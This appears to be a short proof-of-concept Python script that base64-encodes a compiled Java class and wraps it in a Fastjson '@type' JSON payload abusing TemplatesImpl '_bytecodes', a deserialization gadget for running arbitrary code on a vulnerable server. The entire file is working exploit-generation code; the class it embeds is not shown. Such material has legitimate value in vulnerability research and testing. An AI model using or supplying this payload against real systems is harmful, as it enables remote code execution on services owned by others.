import base64

with open('../target/classes/poc1/Temp.class','rb') as f:
    bytecodes = base64.b64encode(f.read()).decode('utf-8')
    payload = '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}' % bytecodes
print(payload)